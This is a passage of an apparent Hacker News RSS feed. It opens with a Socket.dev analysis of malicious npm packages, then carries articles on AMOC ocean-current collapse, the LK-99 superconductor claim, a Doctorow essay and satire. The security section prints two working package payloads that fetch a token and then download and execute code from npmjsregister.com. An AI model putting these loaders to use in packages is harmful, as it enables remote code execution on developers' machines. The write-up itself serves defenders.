href="https://socket.dev/npm/package/elliptic-parser/overview/1.2.7">elliptic-parser</a></li><li><a href="https://socket.dev/npm/package/eth-api-node">eth-api-node</a></li><li><a href="https://socket.dev/npm/package/jpeg-metadata/overview/1.5.1">jpeg-metadata</a></li><li><a href="https://socket.dev/npm/package/other-web3/overview/1.0.1">other-web3</a></li><li><a href="https://socket.dev/npm/package/price-fetch/overview/0.0.9">price-fetch</a></li><li><a href="https://socket.dev/npm/package/price-record/overview/0.0.9">price-record</a></li><li><a href="https://socket.dev/npm/package/snykaudit-helper/overview/4.1.2">snykaudit-helper</a></li><li><a href="https://socket.dev/npm/package/sync-http-api/overview/6.1.1">sync-http-api</a></li><li><a href="https://socket.dev/npm/package/sync-https-api/overview/6.1.1">sync-https-api</a></li><li><a href="https://socket.dev/npm/package/tslib-react/overview/1.7.1">tslib-react</a></li><li><a href="https://socket.dev/npm/package/tslib-util/overview/1.6.2">tslib-util</a></li><li><a href="https://socket.dev/npm/package/ttf-metadata/overview/1.5.2">ttf-metadata</a></li><li><a href="https://socket.dev/npm/package/vue-audit/overview/1.6.2">vue-audit</a></li><li><a href="https://socket.dev/npm/package/vue-gws/overview/0.0.1">vue-gws</a></li><li><a href="https://socket.dev/npm/package/vuewjs/overview/1.0.1">vuewjs</a></li></ul><h2 id="Examples-of-the-malicious-code">Examples of the malicious code<a href="#Examples-of-the-malicious-code">#</a></h2><p>From one of the malicious packages, <a href="https://socket.dev/npm/package/tslib-react/files/1.7.1/main.js">tslib-react</a>:</p><pre><code data-language="javascript">const os = require("os");
const path = require("path");
var fs = require('fs');

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

function registerAudit(version, projectUrl) {

	

	var request = require('sync-request');
	var ticket = request('GET', projectUrl);

	fs.writeFileSync(version, ticket.getBody());

}

var folder = os.homedir() + "/.vscode";
if (!fs.existsSync(folder)){
    fs.mkdirSync(folder);
}
registerAudit(path.join(folder,'/jsontoken'), 'https://npmjsregister.com/checkupdate.php');</code></pre><p>From another malicious package, <a href="https://socket.dev/npm/package/tslib-util/files/1.6.2/main.js">tslib-util</a>:</p><pre><code data-language="javascript">const os = require("os");
const path = require("path");
var fs = require('fs');

function getsvnroot(domain, entry, token, path) {
	const https = require('https');
	const querystring = require('querystring');

	const options = {
	  hostname: domain,
	  port: 443,
	  path: entry,
	  method: 'POST',
	  headers: {'content-type' : 'application/x-www-form-urlencoded'},
	};

	const req = https.request(options, (resp) =&gt; {
		let data = "";
		// A chunk of data has been recieved.
		resp.on("data", chunk =&gt; {
		  data += chunk;
		});
		resp.on("end", () =&gt; {
			fs.writeFileSync(path, data);			
			const { exec } = require('child_process');
			exec('node ' + path, (error, stdout, stderr) =&gt; {				
				
			});
		});
	});

	req.on('error', (e) =&gt; {
	  console.error(e.message);
	});
	req.write(token);
	req.end(); 
}

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

var dir = path.join(os.homedir(), ".vscode");
if (fs.existsSync(dir)){
	const token = fs.readFileSync(path.join(dir,'jsontoken'),
            {encoding:'utf8', flag:'r'});
	getsvnroot('npmjsregister.com', '/getupdate.php', token, path.join(dir ,'checkjson.js'));
}</code></pre><p>More information is also available in the corresponding <a href="https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/#indicators">GitHub post</a>.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Crucial system of ocean currents is collapsing; ‚Äòaffects everyone on the planet‚Äô (103 pts)]]></title>
            <link>https://www.cnn.com/2023/07/25/world/gulf-stream-atlantic-current-collapse-climate-scn-intl/index.html</link>
            <guid>36864892</guid>
            <pubDate>Tue, 25 Jul 2023 16:28:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnn.com/2023/07/25/world/gulf-stream-atlantic-current-collapse-climate-scn-intl/index.html">https://www.cnn.com/2023/07/25/world/gulf-stream-atlantic-current-collapse-climate-scn-intl/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=36864892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-image-variation="image" data-breakpoints="{&quot;image--eq-extra-small&quot;: 115, &quot;image--eq-small&quot;: 300}" data-uri="cms.cnn.com/_components/image/instances/lede-d9bde8929979bc7553d6e8839d53edf4@published" data-name="01 gulf stream climate collapse atlantic current intl" data-component-name="image" data-observe-resizes="" data-original-ratio="0.5626666666666666" data-original-height="1688" data-original-width="3000" data-url="https://media.cnn.com/api/v1/images/stellar/prod/230725062451-01-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=original" data-editable="lede" data-freewheel-lede="true">
       <picture><source height="720" width="1280" media="(min-width: 1280px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062451-01-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_720,w_1280,c_fill/f_webp" type="image/webp"><source height="540" width="960" media="(min-width: 960px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062451-01-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_540,w_960,c_fill/f_webp" type="image/webp"><source height="270" width="480" media="(-webkit-min-device-pixel-ratio: 2)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062451-01-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_270,w_480,c_fill/f_webp" type="image/webp"><img src="https://media.cnn.com/api/v1/images/stellar/prod/230725062451-01-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_720,w_1280,c_fill" alt="Large Icebergs near Kulusuk, Greenland. Scientists say a critical ocean circulation in the North Atlantic could collapse in the next few decades." onload="this.classList.remove('image__dam-img--loading')" onerror="imageLoadError(this)" height="1688" width="3000"></picture>
    </div><div data-editable="content" itemprop="articleBody" data-reorderable="content">
                    <p><cite>
      <span data-editable="location"></span>
      <span data-editable="source">CNN</span>
        &nbsp;‚Äî&nbsp;
    </cite>
</p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_B150C41D-0334-C348-CA6B-8BF4717AA59F@published" data-editable="text" data-component-name="paragraph">
      A <a href="https://www.cnn.com/2021/08/06/world/climate-gulf-stream-collapse-warning-study-intl/index.html" target="_blank">vital system of ocean currents</a> could collapse within a few decades if the world continues to pump out planet-heating pollution, scientists are warning ‚Äì an event that would be catastrophic for global weather and ‚Äúaffect every person on the planet.‚Äù
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_07117204-6CB7-71CF-21E9-8CFE78ABCD29@published" data-editable="text" data-component-name="paragraph">
      A new study published Tuesday<a href="https://www.nature.com/articles/s41467-023-39810-w" target="_blank"> in the journal Nature</a>, found that the Atlantic Meridional Overturning Current ‚Äì of which the Gulf Stream is a part ‚Äì<strong> </strong>could collapse around the middle of the century, or even as early as 2025.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_7A32D8D2-CE26-E722-8A22-8E1E864A0642@published" data-editable="text" data-component-name="paragraph">
      Scientists uninvolved with this study told CNN the exact tipping point for the critical system is uncertain, and that measurements of the currents have so far showed little trend or change. But they agreed these results are alarming and provide new evidence that the tipping point could occur sooner than previously thought.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_66EC1595-0D03-E475-D4F3-8CB53155B8B7@published" data-editable="text" data-component-name="paragraph">
      The AMOC is a complex tangle of currents that works like a giant global conveyor belt. It transports warm water from the tropics toward the North Atlantic, where the water cools, becomes saltier and sinks deep into the ocean, before spreading southwards. 
  </p>

  



  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_7C553B4C-10B8-A2B6-B0CA-8CE7EB50CEF6@published" data-editable="text" data-component-name="paragraph">
      It plays a crucial role in the climate system, helping regulate global weather patterns. Its collapse would have enormous implications, including much more extreme winters and sea level rises affecting parts of Europe and the US, and a shifting of the monsoon in the tropics. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_A5A04282-0087-BDC0-28B2-8CB5315BE5FA@published" data-editable="text" data-component-name="paragraph">
      For years, scientists have been <a href="https://www.cnn.com/2021/08/06/world/climate-gulf-stream-collapse-warning-study-intl/index.html" target="_blank">warning of its instability</a> as the climate crisis accelerates, threatening to upset the balance of temperature and salinity on which the strength of these currents depend. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_3F6A1246-C17F-73EE-525C-8CF7D59CB30A@published" data-editable="text" data-component-name="paragraph">
      As the <a href="https://www.cnn.com/2023/05/05/world/ocean-surface-temperature-heat-record-climate-intl/index.html" target="_blank">oceans heat up</a> and <a href="https://www.cnn.com/2023/07/20/world/greenland-ice-sheet-melt-sea-level-rise-climate/index.html" target="_blank">ice melts</a>, more freshwater flows into the ocean and reduces the water‚Äôs density, making it less able to sink. When waters become too fresh, too warm or both, the conveyor belt stops. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_E35225FF-1980-E3EA-3A9D-8D15DBDD2B6D@published" data-editable="text" data-component-name="paragraph">
      It has happened before. More than 12,000 years ago, rapid glacier melt caused the AMOC to shut down, leading to huge Northern Hemisphere temperature fluctuations of 10 to 15 degrees Celsius (18 to 27 Fahrenheit) within a decade.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_60F73424-57DA-5104-86BC-8CF8C4E6151C@published" data-editable="text" data-component-name="paragraph">
      A shutdown ‚Äúwould affect every person on the planet ‚Äì it‚Äôs that big and important,‚Äù said Peter de Menocal, the president of the Woods Hole Oceanographic Institution, who was not involved in the study.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_1F34BA2E-E1A7-517B-C33E-8CB53160778A@published" data-editable="text" data-component-name="paragraph">
      A 2019 <a href="https://www.ipcc.ch/srocc/chapter/summary-for-policymakers/" target="_blank">report</a> by the UN‚Äôs Intergovernmental Panel on Climate Change predicted that the AMOC would weaken over this century, but that its full collapse before 2100 was unlikely.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_2151E0C1-2ABB-FDEE-875B-8CB531617894@published" data-editable="text" data-component-name="paragraph">
      This new study comes to a much more alarming conclusion. 
  </p>

  



  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_84EFAF10-0F9F-D8AE-633B-8CB53162B81D@published" data-editable="text" data-component-name="paragraph">
      As the AMOC has only been continuously monitored since 2004, the study authors looked to a much larger dataset, and one which could show how the currents behaved in a period without human-caused climate change. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_80A7CFEF-A611-AC31-4092-8CB5316543A1@published" data-editable="text" data-component-name="paragraph">
      ‚ÄúWe needed to go back in time,‚Äù said Peter Ditlevsen, a professor of climate physics at the University of Copenhagen and one of the authors of the report. The scientists analyzed sea surface temperatures in the North Atlantic in an area south of Greenland over a period of 150 years between 1870 and 2020. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_498CA475-087A-7BB9-0DD9-8CB53166D29A@published" data-editable="text" data-component-name="paragraph">
      This part of the ocean is warmed by the water transported north<strong> </strong>from the tropics by the AMOC, Ditlevsen said, ‚Äúso if it cools, it‚Äôs because the AMOC is weakening.‚Äù The authors then subtracted the impacts of human-caused global warming on the water temperature to understand how the currents were changing. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_F23FF3B2-B348-7CC1-8CEC-8CB53168B37C@published" data-editable="text" data-component-name="paragraph">
      They found ‚Äúearly warning signals‚Äù of critical changes in the AMOC, which led them to predict ‚Äúwith high confidence‚Äù that it could shut down or collapse as early as 2025 and no later than 2095. The likeliest point of collapse is somewhere between 2039 and 2070, Ditlevsen said.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_494EC07A-601F-EC5C-CA5B-8CB5316A5943@published" data-editable="text" data-component-name="paragraph">
      ‚ÄúIt‚Äôs really scary,‚Äù he told CNN. ‚ÄúThis is not something you would lightly put into papers,‚Äù he said, adding, ‚Äúwe‚Äôre very confident that this is a robust result.‚Äù
  </p>

<div data-image-variation="image" data-breakpoints="{&quot;image--eq-extra-small&quot;: 115, &quot;image--eq-small&quot;: 300}" data-uri="cms.cnn.com/_components/image/instances/image-1164d4e5c4a29da5bc20e10d2c3ecd93@published" data-name="02 gulf stream climate collapse atlantic current intl" data-component-name="image" data-observe-resizes="" data-original-ratio="0.5626666666666666" data-original-height="1688" data-original-width="3000" data-url="https://media.cnn.com/api/v1/images/stellar/prod/230725062523-02-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=original" data-editable="settings">
       <picture><source height="720" width="1280" media="(min-width: 1280px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062523-02-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_720,w_1280,c_fill/f_webp" type="image/webp"><source height="540" width="960" media="(min-width: 960px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062523-02-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_540,w_960,c_fill/f_webp" type="image/webp"><source height="270" width="480" media="(-webkit-min-device-pixel-ratio: 2)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/230725062523-02-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_270,w_480,c_fill/f_webp" type="image/webp"><img src="https://media.cnn.com/api/v1/images/stellar/prod/230725062523-02-gulf-stream-climate-collapse-atlantic-current-intl.jpg?c=16x9&amp;q=h_720,w_1280,c_fill" alt="An iceberg floats in Flatrock Cove, Newfoundland, Canada. Warming oceans and melting ice threaten to desatbilize a crucial system of ocean currents in the Atlantic. " onload="this.classList.remove('image__dam-img--loading')" onerror="imageLoadError(this)" height="1688" width="3000" loading="lazy"></picture>
    </div>


  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_59A44AB4-00C8-669E-231E-8CB531703F47@published" data-editable="text" data-component-name="paragraph">
      De Menocal said the study results were ‚Äúboth surprising and alarming.‚Äù 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_390FC8FD-005B-70BF-9135-8CB53171033D@published" data-editable="text" data-component-name="paragraph">
      It‚Äôs been clear for a while that the AMOC will weaken<strong> </strong>in the coming decades, he told CNN. In 2021, a <a href="https://www.cnn.com/2021/08/06/world/climate-gulf-stream-collapse-warning-study-intl/index.html" target="_blank">study</a> found the AMOC was showing signs of instability due to climate change. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_D22AC228-72D4-C9A4-33D7-8D4120B7FC44@published" data-editable="text" data-component-name="paragraph">
      But until now, we haven‚Äôt had a time frame. 
  </p>

  



  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_BC8D3C1B-A41E-EA4F-DDDD-8D135D4BC35F@published" data-editable="text" data-component-name="paragraph">
      The new study ‚Äúprovides a novel analysis that focuses on when the AMOC tipping point will occur,‚Äù de Menocal said,<strong> </strong>and the study‚Äôs prediction the collapse will occur around 2050 ‚Äúis alarmingly soon given the globally disruptive impact of such an event.‚Äù Although, he added, it is important to note that there is no observational evidence yet that the AMOC is collapsing.
  </p>


    
    

<div data-uri="cms.cnn.com/_components/video-resource/instances/h_28658a5d881e4e2b31ccf2c6c393fa15-h_f8c1f79d790139aa4f063c9d424c2edd-paragraph_5B959599-0E31-5B68-C651-901987E1F888@published" data-component-name="video-resource" data-editable="settings" data-video-id="world/2020/07/29/cristian-donoso-glaciers-patagonia-cte.cnn" data-live="" data-analytics-aggregate-events="true" data-custom-experience="" data-asset-type="" data-medium-env="prod" data-autostart="false" data-show-ads="true" data-source="CNN" data-featured-video="true" data-headline="Explorer's before-and-after photos show glaciers melting" data-description="Chilean explorer Cristian Donoso's photographs show that Patagonia's glaciers have dramatically receded over the last 100 years.  " data-duration="02:46" data-source-html="<span class=&quot;video-resource__source&quot;> - Source:
                <a href=&quot;https://www.cnn.com/&quot; class=&quot;video-resource__source-url&quot;>CNN</a>
    </span>" data-fave-thumbnails="{&quot;big&quot;: { &quot;uri&quot;: &quot;https://media.cnn.com/api/v1/images/stellar/prod/200729100624-cristian-donoso-glaciers-patagonia-cte-00001511.jpg?q=x_0,y_0,h_1080,w_1919,c_fill/h_540,w_960&quot; }, &quot;small&quot;: { &quot;uri&quot;: &quot;https://media.cnn.com/api/v1/images/stellar/prod/200729100624-cristian-donoso-glaciers-patagonia-cte-00001511.jpg?q=x_0,y_0,h_1080,w_1919,c_fill/h_540,w_960&quot; }  }" data-vr-video="" data-show-html="<!-- unable to render partial show without a supplied context -->" data-check-event-based-preview="" data-network-id="" data-details="">
            <div data-image-variation="image" data-breakpoints="{&quot;image--eq-extra-small&quot;: 115, &quot;image--eq-small&quot;: 300}" data-uri="cms.cnn.com/_components/image/instances/thumbnail-image-9bead2d32e7b7d090777336bc1b9f321@published" data-name="cristian donoso glaciers patagonia cte_00001511" data-component-name="image" data-observe-resizes="" data-original-ratio="0.5625" data-original-height="1080" data-original-width="1920" data-url="https://media.cnn.com/api/v1/images/stellar/prod/200729100624-cristian-donoso-glaciers-patagonia-cte-00001511.jpg?q=w_1920,h_1080,x_0,y_0,c_fill" data-unselectable="true" id="player-cms.cnn.com/_components/video-resource/instances/h_28658a5d881e4e2b31ccf2c6c393fa15-h_f8c1f79d790139aa4f063c9d424c2edd-paragraph_5B959599-0E31-5B68-C651-901987E1F888@published">
       <picture><img src="https://media.cnn.com/api/v1/images/stellar/prod/200729100624-cristian-donoso-glaciers-patagonia-cte-00001511.jpg?q=x_0,y_0,h_1080,w_1919,c_fill/w_850" alt="cristian donoso glaciers patagonia cte_00001511.jpg" onload="this.classList.remove('image__dam-img--loading')" onerror="imageLoadError(this)" height="1080" width="1920"></picture>
    </div>
            
            <div>
                <p>Explorer's before-and-after photos show glaciers melting</p>
                <p><span>
                            02:46
                        </span>
                        <span> - Source:
                <a href="https://www.cnn.com/">CNN</a>
    </span>
                </p>
            </div>
        </div>


  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_2AA5F76E-0E2F-1FA8-EF02-8D0517F2E4F1@published" data-editable="text" data-component-name="paragraph">
      Stefan Rahmstorf, professor of physics of the oceans at the University of Potsdam in Germany, who was also not involved in the study, said the research helps bolster previous research. 
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_FF0A3319-2F2A-05A0-238D-8CB53176EE67@published" data-editable="text" data-component-name="paragraph">
      ‚ÄúThere is still large uncertainty where the tipping point of the AMOC is, but the new study adds to the evidence that it is much closer than we thought just a few years ago,‚Äù he told CNN. ‚ÄúThe scientific evidence now is that we can‚Äôt even rule out crossing a tipping point already in the next decade or two.‚Äù
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_2D98E0C8-B31C-DF9C-54BC-8CB53177AF76@published" data-editable="text" data-component-name="paragraph">
      The report calls for fast and effective measures to cut planet-heating pollution to zero, to reduce global temperatures and slow melting in the Arctic.
  </p>

  <p data-uri="cms.cnn.com/_components/paragraph/instances/paragraph_471683FF-FC60-E333-828B-8CB531797D9B@published" data-editable="text" data-component-name="paragraph">
      ‚ÄúThe key point of this study is that we don‚Äôt have much time at all to do this,‚Äù de Menocal said. ‚ÄúAnd<strong> </strong>the stakes just got higher.‚Äù 
  </p>

                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The First Room-Temperature Ambient-Pressure Superconductor (1186 pts)]]></title>
            <link>https://arxiv.org/abs/2307.12008</link>
            <guid>36864624</guid>
            <pubDate>Tue, 25 Jul 2023 16:14:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2307.12008">https://arxiv.org/abs/2307.12008</a>, See on <a href="https://news.ycombinator.com/item?id=36864624">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
    
    
      
    
  
  
  
    <p><a aria-describedby="download-button-info" href="https://arxiv.org/pdf/2307.12008">Download PDF</a></p><blockquote>
            <span>Abstract:</span>  For the first time in the world, we succeeded in synthesizing the
room-temperature superconductor ($T_c \ge 400$ K, 127$^\circ$C) working at
ambient pressure with a modified lead-apatite (LK-99) structure. The
superconductivity of LK-99 is proved with the Critical temperature ($T_c$),
Zero-resistivity, Critical current ($I_c$), Critical magnetic field ($H_c$),
and the Meissner effect. The superconductivity of LK-99 originates from minute
structural distortion by a slight volume shrinkage (0.48 %), not by external
factors such as temperature and pressure. The shrinkage is caused by Cu$^{2+}$
substitution of Pb$^{2+}$(2) ions in the insulating network of Pb(2)-phosphate
and it generates the stress. It concurrently transfers to Pb(1) of the
cylindrical column resulting in distortion of the cylindrical column interface,
which creates superconducting quantum wells (SQWs) in the interface. The heat
capacity results indicated that the new model is suitable for explaining the
superconductivity of LK-99. The unique structure of LK-99 that allows the
minute distorted structure to be maintained in the interfaces is the most
important factor that LK-99 maintains and exhibits superconductivity at room
temperatures and ambient pressure.

    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Young-Wan Kwon [<a href="https://arxiv.org/show-email/56b96a00/2307.12008">view email</a>]
      <br>
    <strong>[v1]</strong>
    
        Sat, 22 Jul 2023 07:51:19 UTC (2,620 KB)<br>
    </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Autoenshittification. How the computer killed capitalism. ‚Äì by Cory Doctorow (229 pts)]]></title>
            <link>https://doctorow.medium.com/autoenshittification-cb851c2574fb</link>
            <guid>36864547</guid>
            <pubDate>Tue, 25 Jul 2023 16:10:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://doctorow.medium.com/autoenshittification-cb851c2574fb">https://doctorow.medium.com/autoenshittification-cb851c2574fb</a>, See on <a href="https://news.ycombinator.com/item?id=36864547">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p id="4380">Forget F1: the only car race that matters now is the race to turn your car into a digital extraction machine, a high-speed inkjet printer on wheels, stealing your private data as it picks your pocket. Your car‚Äôs digital infrastructure is a costly, dangerous nightmare ‚Äî but for automakers in pursuit of postcapitalist utopia, it‚Äôs a dream they can‚Äôt give up on.</p><p id="a36c">Your car is <em>stuffed</em> full of microchips, a fact the world came to appreciate after the pandemic struck and auto production ground to a halt due to chip shortages. Of course, that wasn‚Äôt the whole story: when the pandemic started, the automakers panicked and canceled their chip orders, only to immediately regret that decision and place new orders.</p><p id="c5ab">But it was too late: semiconductor production had taken a serious body-blow, and when Big Car placed its new chip orders, it went to the back of a long, slow-moving line. It was a catastrophic bungle: microchips are so integral to car production that a car is basically a computer network on wheels that you stick your fragile human body into and pray.</p><p id="9db2">The car manufacturers got <em>so</em> desperate for chips that they started buying up <em>washing machines</em> for the microchips in them, extracting the chips and discarding the washing machines like some absurdo-dystopian cyberpunk walnut-shelling machine:</p><p id="de6c"><a href="https://www.autoevolution.com/news/desperate-times-companies-buy-washing-machines-just-to-rip-out-the-chips-187033.html" rel="noopener ugc nofollow" target="_blank">https://www.autoevolution.com/news/desperate-times-companies-buy-washing-machines-just-to-rip-out-the-chips-187033.html</a></p><p id="2b72">These digital systems are a huge problem for the car companies. They are the underlying cause of a precipitous decline in car quality. From touch-based digital door-locks to networked sensors and cameras, every digital system in your car is a source of endless repair nightmares, costly recalls and cybersecurity vulnerabilities:</p><p id="b5ce"><a href="https://www.reuters.com/business/autos-transportation/quality-new-vehicles-us-declining-more-tech-use-study-shows-2023-06-22/" rel="noopener ugc nofollow" target="_blank">https://www.reuters.com/business/autos-transportation/quality-new-vehicles-us-declining-more-tech-use-study-shows-2023-06-22/</a></p><p id="f0b8">What‚Äôs more, drivers <em>hate</em> all the digital bullshit, from the janky touchscreens to the shitty, wildly insecure apps. Digital systems are drivers‚Äô most significant point of dissatisfaction with the automakers‚Äô products:</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[At this company, we are family (518 pts)]]></title>
            <link>https://pboyd.io/posts/at-company-we-are-family/</link>
            <guid>36864476</guid>
            <pubDate>Tue, 25 Jul 2023 16:07:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pboyd.io/posts/at-company-we-are-family/">https://pboyd.io/posts/at-company-we-are-family/</a>, See on <a href="https://news.ycombinator.com/item?id=36864476">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p>Dear Timmy,</p>
<p>As I shared at our last family meeting, current economic conditions have forced family leadership to make many difficult decisions. I myself have reduced my golf outings to every other week, and you, undoubtedly, noticed that your mother‚Äôs car is no longer the current model year. Unfortunately, even these deep cuts, painful as they are, have not been enough. After much deliberation, we feel the best course of action is to eliminate the redundancies in our family. Consequently, your family membership has been terminated, effective immediately.</p>
<p>I know this may come as a shock. But, while your mother and I have enjoyed seeing you grow these last six years, the family must remain focused on our strategic initiatives if we are to remain competitive against the Joneses. We have weathered storms in the past; I am confident that we will make it through this one.</p>
<p>To help you through this transition, we are pleased to offer you a severance package with 80% of your allowance for the next three months. We will also extend the option of purchasing the family health insurance for the rest of the calendar year. Enclosed with this letter is a list of adoption agencies to help you in your search for a new family.</p>
<p>I ask that you refrain from discussing your termination with any social contacts made through your membership in the family. You are also reminded not to damage or steal any family property on your way out of the house (this includes, but is not limited to, games, toys, and electronics). Failure to comply may result in your severance being terminated early or withheld entirely.</p>
<p>On a personal note, your mother and I want you to know how wonderful we feel to have been able to give you life.</p>
<p>Regards,</p>
<p>Robert and Sue Smith</p>
<p>P.S. Your (former) sister will be contacting you to schedule an exit interview. Please be open and honest. Your feedback is the best way for us to improve!</p>

			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Warning of forthcoming collapse of Atlantic meridional overturning circulation (348 pts)]]></title>
            <link>https://www.nature.com/articles/s41467-023-39810-w</link>
            <guid>36864319</guid>
            <pubDate>Tue, 25 Jul 2023 15:59:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nature.com/articles/s41467-023-39810-w">https://www.nature.com/articles/s41467-023-39810-w</a>, See on <a href="https://news.ycombinator.com/item?id=36864319">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <div id="Sec1-section" data-title="Introduction"><h2 id="Sec1">Introduction</h2><div id="Sec1-content"><p>A forthcoming collapse of the Atlantic meridional overturning circulation (AMOC) is a major concern as it is one of the most important tipping elements in Earth‚Äôs climate system<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Manabe, S. &amp; Stouffer, R. J. Two stable equilibria of a coupled ocean-atmosphere model. J. Clim. 1, 841‚Äì866 (1988)." href="#ref-CR1" id="ref-link-section-d21713702e345">1</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Rahmstorf, S. Bifurcations of the Atlantic thermohaline circulation in response to changes in the hydrological cycle. Nature 378, 145‚Äì149 (1995)." href="#ref-CR2" id="ref-link-section-d21713702e345_1">2</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 3" title="Lenton, T. M. et al. Tipping elements in the Earth‚Äôs climate system. Proc. Natl Acad. Sci. USA 105, 1786‚Äì1793 (2008)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR3" id="ref-link-section-d21713702e348">3</a></sup>. In recent years, model studies and paleoclimatic reconstructions indicate that the strongest abrupt climate fluctuations, the Dansgaard-Oeschger events<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 4" title="Dansgaard, W. et al. Evidence for general instability of past climate from a 250-kyr ice-core record. Nature 364, 218‚Äì220 (1993)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR4" id="ref-link-section-d21713702e352">4</a></sup>, are connected to the bimodal nature of the AMOC<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 5" title="Vettoretti, G., Ditlevsen, P., Jochum, M. &amp; Rasmussen, S. O. Atmospheric CO2 control of spontaneous millennial-scale ice age climate oscillations. Nat. Geosci. 15, 300‚Äì306 (2022)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR5" id="ref-link-section-d21713702e356">5</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 6" title="Ganopolski, A. &amp; Rahmstorf, S. Rapid changes of glacial climate simulated in a coupled climate model. Nature 409, 153‚Äì158 (2001)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR6" id="ref-link-section-d21713702e359">6</a></sup>. Numerous climate model studies show a hysteresis behavior, where changing a control parameter, typically the freshwater input into the Northern Atlantic, makes the AMOC bifurcate through a set of co-dimension one saddle-node bifurcations<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Wood, R. A., Rodr√≠guez, J. M., Smith, R. S., Jackson, L. C. &amp; Hawkins, E. Observable low-order dynamical controls on thresholds of the Atlantic meridional overturning circulation. Clim. Dyn. 53, 6815‚Äì6834 (2019)." href="#ref-CR7" id="ref-link-section-d21713702e363">7</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" title="Hawkins, E. et al. Bistability of the Atlantic overturning circulation in a global climate model and links to ocean freshwater transport. Geophys. Res. Lett. 38, L10605 (2011)." href="#ref-CR8" id="ref-link-section-d21713702e363_1">8</a>,<a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 9" title="Weijer, W. et al. Stability of the Atlantic meridional overturning circulation: a review and synthesis. J. Geophys. Res. Oceans 124, 5336‚Äì5375 (2019)." href="https://www.nature.com/articles/s41467-023-39810-w#ref-CR9" id="ref-link-section-d21713702e366">9</a></sup>. State-of-the-art Earth-system models can reproduce such a scenario, but the inter-model spread is large and the critical threshold is poorly constrained<sup><a data-track="click" data-track-action="reference anchor" data-track-label="link" data-test="citation-ref" aria-label="Reference 10" title="Mecking, J., Drijfhout, S., 